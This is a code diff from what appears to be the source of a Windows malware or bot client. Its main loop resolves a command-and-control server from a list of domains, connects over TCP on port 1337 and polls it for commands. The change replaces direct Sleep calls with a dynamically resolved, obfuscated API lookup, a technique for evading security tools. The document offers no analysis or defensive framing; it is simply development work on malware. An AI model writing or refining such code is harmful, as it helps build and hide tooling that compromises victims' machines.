@@ -28,6 +28,7 @@ void get_command(TCPClient client) {
 
 int  main(/*HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, int n_cmd_show*/) {
     initilize_winapi();
+    sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
     std::string cnc_ip = "";
     while (cnc_ip == "") {
         for (const char* domain : CNC_DOMAINS) {
@@ -36,13 +37,13 @@ int  main(/*HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, i
                 break;
             }
         }
-        Sleep(1000 * 10);
+        sleep(1000 * 10);
     }
     TCPClient client(cnc_ip.c_str(), 1337);
     // Command handler:
     while (1) {
         get_command(client);
-        Sleep(1000 * 10);
+        sleep(1000 * 10);
     }
     return 0;
 }
